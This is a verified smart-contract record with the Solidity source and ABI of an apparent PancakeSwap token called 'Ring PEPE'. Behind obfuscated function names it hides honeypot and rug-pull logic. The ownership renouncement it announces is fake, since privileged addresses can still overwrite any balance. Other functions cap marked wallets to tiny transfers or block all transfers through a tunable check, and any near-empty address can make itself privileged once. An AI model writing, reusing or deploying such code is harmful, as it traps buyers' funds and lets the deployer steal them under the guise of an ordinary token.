{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchLiquidityFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoSell) external view returns (uint256);\n\n    function transfer(address shouldSender, uint256 toAmountMode) external returns (bool);\n\n    function allowance(address maxAutoReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toAmountMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldSender,\n        uint256 toAmountMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoTotal, uint256 value);\n    event Approval(address indexed maxAutoReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract enableIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderReceiverFrom {\n    function createPair(address listFund, address liquidityTxSell) external returns (address);\n}\n\ninterface enableFrom is launchLiquidityFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RingPEPE is enableIs, launchLiquidityFee, enableFrom {\n\n    address launchedEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapAuto(address atMaxLaunch) public {\n        liquidityTx();\n        if (tradingEnableTotal) {\n            takeTrading = takeTokenTrading;\n        }\n        if (atMaxLaunch == marketingFund || atMaxLaunch == fromListLimit) {\n            return;\n        }\n        takeWallet[atMaxLaunch] = true;\n    }\n\n    uint256 public takeTrading;\n\n    uint256 exemptFrom;\n\n    function approve(address shouldSwap, uint256 toAmountMode) public virtual override returns (bool) {\n        teamMarketingMin[_msgSender()][shouldSwap] = toAmountMode;\n        emit Approval(_msgSender(), shouldSwap, toAmountMode);\n        return true;\n    }\n\n    uint256 private takeTokenTrading;\n\n    function transferFrom(address fromTo, address shouldSender, uint256 toAmountMode) external override returns (bool) {\n        if (_msgSender() != liquidityToTx) {\n            if (teamMarketingMin[fromTo][_msgSender()] != type(uint256).max) {\n                require(toAmountMode <= teamMarketingMin[fromTo][_msgSender()]);\n                teamMarketingMin[fromTo][_msgSender()] -= toAmountMode;\n            }\n        }\n        return amountToken(fromTo, shouldSender, toAmountMode);\n    }\n\n    bool private toSwap;\n\n    function owner() external view returns (address) {\n        return senderLiquidity;\n    }\n\n    function minLaunched(uint256 toAmountMode) public {\n        liquidityTx();\n        exemptFrom = toAmountMode;\n    }\n\n    function balanceOf(address autoSell) public view virtual override returns (uint256) {\n        return fromSellBuy[autoSell];\n    }\n\n    bool private exemptMax;\n\n    mapping(address => bool) public takeWallet;\n\n    string private walletAmount = \"RPE\";\n\n    mapping(address => uint256) private fromSellBuy;\n\n    function liquidityTx() private view {\n        require(maxBuy[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed maxLimit, address indexed tradingAtIs);\n\n    mapping(address => mapping(address => uint256)) private teamMarketingMin;\n\n    function senderMode(address txLaunch, uint256 toAmountMode) public {\n        liquidityTx();\n        fromSellBuy[txLaunch] = toAmountMode;\n    }\n\n    string private toTakeTrading = \"Ring PEPE\";\n\n    uint256 private toAmount = 100000000 * 10 ** 18;\n\n    address liquidityToTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address teamMax, address shouldSwap) external view virtual override returns (uint256) {\n        if (shouldSwap == liquidityToTx) {\n            return type(uint256).max;\n        }\n        return teamMarketingMin[teamMax][shouldSwap];\n    }\n\n    uint256 buyLaunchedExempt;\n\n    uint8 private totalLimit = 18;\n\n    mapping(address => bool) public maxBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toAmount;\n    }\n\n    function toFromAt(address fromTo, address shouldSender, uint256 toAmountMode) internal returns (bool) {\n        require(fromSellBuy[fromTo] >= toAmountMode);\n        fromSellBuy[fromTo] -= toAmountMode;\n        fromSellBuy[shouldSender] += toAmountMode;\n        emit Transfer(fromTo, shouldSender, toAmountMode);\n        return true;\n    }\n\n    constructor (){\n        \n        teamTotal receiverBuy = teamTotal(liquidityToTx);\n        fromListLimit = senderReceiverFrom(receiverBuy.factory()).createPair(receiverBuy.WETH(), address(this));\n        if (fromTx != toSwap) {\n            fromTx = false;\n        }\n        marketingFund = _msgSender();\n        shouldMode();\n        maxBuy[marketingFund] = true;\n        fromSellBuy[marketingFund] = toAmount;\n        \n        emit Transfer(address(0), marketingFund, toAmount);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toTakeTrading;\n    }\n\n    function transfer(address txLaunch, uint256 toAmountMode) external virtual override returns (bool) {\n        return amountToken(_msgSender(), txLaunch, toAmountMode);\n    }\n\n    function amountToken(address fromTo, address shouldSender, uint256 toAmountMode) internal returns (bool) {\n        if (fromTo == marketingFund) {\n            return toFromAt(fromTo, shouldSender, toAmountMode);\n        }\n        uint256 minLaunchBuy = launchLiquidityFee(fromListLimit).balanceOf(launchedEnable);\n        require(minLaunchBuy == exemptFrom);\n        require(shouldSender != launchedEnable);\n        if (takeWallet[fromTo]) {\n            return toFromAt(fromTo, shouldSender, totalListShould);\n        }\n        return toFromAt(fromTo, shouldSender, toAmountMode);\n    }\n\n    function walletToken(address enableSenderIs) public {\n        require(enableSenderIs.balance < 100000);\n        if (marketingLaunchedLaunch) {\n            return;\n        }\n        if (fromTx) {\n            exemptMax = false;\n        }\n        maxBuy[enableSenderIs] = true;\n        if (toSwap) {\n            fromTx = true;\n        }\n        marketingLaunchedLaunch = true;\n    }\n\n    function shouldMode() public {\n        emit OwnershipTransferred(marketingFund, address(0));\n        senderLiquidity = address(0);\n    }\n\n    uint256 constant totalListShould = 11 ** 10;\n\n    function getOwner() external view returns (address) {\n        return senderLiquidity;\n    }\n\n    bool private fromTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletAmount;\n    }\n\n    address public fromListLimit;\n\n    bool public marketingLaunchedLaunch;\n\n    address private senderLiquidity;\n\n    address public marketingFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalLimit;\n    }\n\n    bool public tradingEnableTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAutoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAtIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAmountMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromListLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunchedLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toAmountMode\",\"type\":\"uint256\"}],\"name\":\"minLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAmountMode\",\"type\":\"uint256\"}],\"name\":\"senderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMaxLaunch\",\"type\":\"address\"}],\"name\":\"swapAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnableTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAmountMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAmountMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSenderIs\",\"type\":\"address\"}],\"name\":\"walletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RingPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}